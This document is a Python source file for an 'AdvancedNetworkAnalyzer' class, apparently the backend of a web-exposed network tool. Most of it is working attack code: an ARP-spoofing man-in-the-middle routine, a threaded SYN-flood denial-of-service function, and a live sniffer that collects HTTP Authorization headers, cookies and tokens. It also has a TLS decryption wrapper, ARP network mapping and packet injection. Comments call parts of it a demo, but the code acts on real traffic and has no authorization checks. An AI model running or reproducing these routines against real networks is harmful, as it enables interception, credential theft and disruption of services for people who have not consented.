import pyshark
import scapy.all as scapy
import subprocess
import threading
import time
import asyncio
import os
from typing import List, Dict, Any
from cryptography.fernet import Fernet

class AdvancedNetworkAnalyzer:
    def __init__(self, interface: str = "eth0"):
        self.interface = interface
        self.encryption_key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.encryption_key)

    def enable_promiscuous_mode(self):
        """Enable promiscuous mode on interface."""
        try:
            cmd = f"ip link set {self.interface} promisc on"
            subprocess.run(cmd, shell=True, check=True)
            return True
        except Exception as e:
            print(f"Failed to enable promisc mode: {e}")
            return False

    def mitm_attack(self, target_ip: str, gateway_ip: str, duration: int = 10):
        """Execute Man-in-the-Middle attack via ARP Spoofing."""
        stop_event = threading.Event()
        
        def arp_spoof():
            try:
                target_mac = scapy.getmacbyip(target_ip)
                gateway_mac = scapy.getmacbyip(gateway_ip)
                
                if not target_mac or not gateway_mac:
                    print("Could not resolve MAC addresses for MITM")
                    return

                while not stop_event.is_set():
                    # Spoof target: "I am the gateway"
                    packet1 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
                    # Spoof gateway: "I am the target"
                    packet2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
                    
                    scapy.send(packet1, verbose=False)
                    scapy.send(packet2, verbose=False)
                    time.sleep(2)
            except Exception as e:
                print(f"MITM Error: {e}")

        # Run for specified duration then clean up
        thread = threading.Thread(target=arp_spoof)
        thread.daemon = True
        thread.start()
        
        # In a real app we'd manage this state better, for now we block/sleep for demo
        # or just return "Attacking" and let it run.
        # Given the API request/response nature, we'll run for duration then stop.
        time.sleep(duration)
        stop_event.set()
        
        # Restore (simplify for demo)
        return {"status": "completed", "duration": duration}

    def dos_attack(self, target_ip: str, port: int = 80, duration: int = 30):
        """Execute DoS attack (SYN Flood)."""
        stop_event = threading.Event()
        
        def flood():
            packet = scapy.IP(dst=target_ip) / scapy.TCP(dport=port, flags="S")
            while not stop_event.is_set():
                scapy.send(packet, verbose=False)
        
        threads = []
        for _ in range(5): # Limit threads for safety in demo
            t = threading.Thread(target=flood)
            t.daemon = True
            t.start()
            threads.append(t)
            
        time.sleep(duration)
        stop_event.set()
        return {"status": "completed", "packets_sent": "lots"}

    def decrypt_ssl_traffic(self, pcap_path: str, key_path: str):
        """Decrypt SSL/TLS traffic (Stub/Wrapper)."""
        # This typically requires Tshark with specific args
        output_file = pcap_path.replace(".pcap", "_decrypted.pcap")
        cmd = [
            "tshark", 
            "-r", pcap_path,
            "-o", f"ssl.keys_list:0,https,{key_path}",
            "-w", output_file
        ]
        try:
            subprocess.run(cmd, check=True)
            return {"status": "success", "file": output_file}
        except subprocess.CalledProcessError as e:
            return {"status": "error", "message": str(e)}


    def network_mapper(self, subnet: str) -> List[Dict[str, str]]:
        """Map all devices in network using ARP."""
        try:
            # scapy srp requires root, which we should have in docker
            arp = scapy.ARP(pdst=subnet)
            ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether / arp
            
            # Reduce timeout for web responsiveness
            result = scapy.srp(packet, timeout=2, verbose=False, iface=self.interface)[0]

            devices = []
            for sent, received in result:
                devices.append({'ip': received.psrc, 'mac': received.hwsrc})
            return devices
        except Exception as e:
            print(f"Network mapper error: {e}")
            return []

    async def packet_capture(self, duration: int = 5, packet_count: int = 10, display_filter: str = "") -> List[Dict[str, Any]]:
        """Capture packets for a fixed duration and return simplified details."""
        packets_data = []
        
        try:
            # display_filter applies Wireshark display filters (e.g., 'tcp.port == 80')
            capture = pyshark.LiveCapture(interface=self.interface, display_filter=display_filter)
            
            # Use sniff_continuously to yield packets as they come
            # We add a timeout mechanism
            start_time = time.time()
            
            for packet in capture.sniff_continuously(packet_count=packet_count):
                if time.time() - start_time > duration:
                    break
                
                pkt_info = {
                    "timestamp": getattr(packet, "sniff_time", str(time.time())),
                    "protocol": packet.highest_layer,
                    "length": packet.length,
                    "source": packet.ip.src if hasattr(packet, 'ip') else "Unknown",
                    "destination": packet.ip.dst if hasattr(packet, 'ip') else "Unknown",
                    "info": str(packet) # Basic string representation
                }
                
                # Extract some specific layer info if available
                if hasattr(packet, 'http'):
                    pkt_info['info'] = f"HTTP {packet.http.request_method if hasattr(packet.http, 'request_method') else ''} {packet.http.host if hasattr(packet.http, 'host') else ''}"
                elif hasattr(packet, 'dns'):
                    pkt_info['info'] = f"DNS {packet.dns.qry_name if hasattr(packet.dns, 'qry_name') else ''}"

                packets_data.append(pkt_info)
                
            capture.close()
            return packets_data

        except Exception as e:
            print(f"Capture error: {e}")
            return [{"error": str(e)}]

    def extract_sensitive_data(self, duration: int = 10) -> Dict[str, List[str]]:
        """Sniff and look for sensitive patterns (mock/demo version safe for web)."""
        sensitive_data = {
            'credentials': [],
            'cookies': [],
            'tokens': []
        }
        
        try:
            capture = pyshark.LiveCapture(interface=self.interface)
            # Run for a short burst
            capture.sniff(timeout=duration)
            
            for packet in capture:
                if hasattr(packet, 'http'):
                    if hasattr(packet.http, 'authorization'):
                        sensitive_data['credentials'].append(packet.http.authorization)
                    if hasattr(packet.http, 'cookie'):
                        sensitive_data['cookies'].append(packet.http.cookie)

                if hasattr(packet, 'tcp'):
                    payload = str(packet.tcp.payload) if hasattr(packet.tcp, 'payload') else ''
                    if 'token' in payload.lower():
                        sensitive_data['tokens'].append(payload[:50] + "...") # Truncate for display

            capture.close()
            return sensitive_data
        except Exception as e:
            return {"error": [str(e)]}

    def inject_packet(self, target_ip: str, port: int = 80, count: int = 1):
        """Inject a custom TCP packet (Simulation of traffic generation)."""
        try:
            packet = scapy.IP(dst=target_ip) / scapy.TCP(dport=port) / "VortexProbe"
            scapy.send(packet, count=count, verbose=False)
            return {"status": "success", "message": f"Sent {count} probes to {target_ip}:{port}"}
        except Exception as e:
            return {"status": "error", "message": str(e)}
